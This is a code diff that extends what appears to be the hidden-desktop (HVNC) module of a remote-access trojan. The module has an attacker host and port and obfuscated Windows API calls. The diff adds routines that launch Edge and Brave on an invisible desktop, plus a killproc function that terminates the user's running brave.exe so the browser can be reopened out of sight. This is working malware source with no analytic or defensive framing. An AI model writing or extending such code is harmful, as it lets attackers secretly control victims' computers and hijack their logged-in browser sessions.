@@ -1,5 +1,10 @@
 #include "HiddenDesktop.h"
 #include <Windowsx.h>
+#include <Windows.h>
+#include <Process.h>
+#include <Tlhelp32.h>
+#include <Winbase.h>
+#include <String.h>
 
 enum Connection { desktop, input };
 enum Input      { mouse };
@@ -7,7 +12,7 @@ enum Input      { mouse };
 static const BYTE     gc_magik[] = { 'M', 'E', 'L', 'T', 'E', 'D', 0 };
 static const COLORREF gc_trans   = RGB(255, 174, 201);
 
-enum WmStartApp { startExplorer = WM_USER + 1, startRun, startChrome, startFirefox, startIexplore, startPowershell };
+enum WmStartApp { startExplorer = WM_USER + 1, startRun, startChrome, startEdge, startBrave, startFirefox, startIexplore, startPowershell };
 
 static int        g_port;
 static char       g_host[MAX_PATH];
@@ -179,7 +184,7 @@ static BOOL GetDeskPixels(int serverWidth, int serverHeight)
       if(same)
          return TRUE;
 
-      Funcs::pMemcpy(g_oldPixels, g_tempPixels, g_bmpInfo.bmiHeader.biSizeImage); //TODO: CRT call
+      Funcs::pMemcpy(g_oldPixels, g_tempPixels, g_bmpInfo.bmiHeader.biSizeImage);
    }
    else
       Funcs::pMemcpy(g_oldPixels, g_pixels, g_bmpInfo.bmiHeader.biSizeImage);
@@ -288,6 +293,29 @@ exit:
    return 0;
 }
 
+static void killproc(const char* name)
+{
+    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
+    PROCESSENTRY32 pEntry;
+    pEntry.dwSize = sizeof(pEntry);
+    BOOL hRes = Process32First(hSnapShot, &pEntry);
+    while (hRes)
+    {
+        if (strcmp(pEntry.szExeFile, name) == 0)
+        {
+            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
+                (DWORD)pEntry.th32ProcessID);
+            if (hProcess != NULL)
+            {
+                TerminateProcess(hProcess, 9);
+                CloseHandle(hProcess);
+            }
+        }
+        hRes = Process32Next(hSnapShot, &pEntry);
+    }
+    CloseHandle(hSnapShot);
+}
+
 static void StartChrome()
 {
    char chromePath[MAX_PATH] = { 0 };
@@ -318,6 +346,35 @@ static void StartChrome()
    startupInfo.lpDesktop           = g_desktopName;
    PROCESS_INFORMATION processInfo = { 0 };
    Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
+}
+
+static void StartEdge()
+{
+    char path[MAX_PATH] = { 0 };
+    Funcs::pLstrcpyA(path, Strs::hd8);
+    Funcs::pLstrcatA(path, Strs::edgeExe);
+    Funcs::pLstrcatA(path, Strs::hd9);
+
+    STARTUPINFOA startupInfo = { 0 };
+    startupInfo.cb = sizeof(startupInfo);
+    startupInfo.lpDesktop = g_desktopName;
+    PROCESS_INFORMATION processInfo = { 0 };
+    Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
+}
+
+static void StartBrave()
+{
+    killproc("brave.exe");
+    char path[MAX_PATH] = { 0 };
+    Funcs::pLstrcpyA(path, Strs::hd8);
+    Funcs::pLstrcatA(path, Strs::braveExe);
+    Funcs::pLstrcatA(path, Strs::hd9);
+
+    STARTUPINFOA startupInfo = { 0 };
+    startupInfo.cb = sizeof(startupInfo);
+    startupInfo.lpDesktop = g_desktopName;
+    PROCESS_INFORMATION processInfo = { 0 };
+    Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
 }
 
 static void StartFirefox()
@@ -533,6 +590,16 @@ static DWORD WINAPI InputThread(LPVOID param)
          {
             StartChrome();
             break;
+         }
+         case WmStartApp::startEdge:
+         {
+             StartEdge();
+             break;
+         }
+         case WmStartApp::startBrave:
+         {
+             StartBrave();
+             break;
          }
          case WmStartApp::startFirefox:
          {
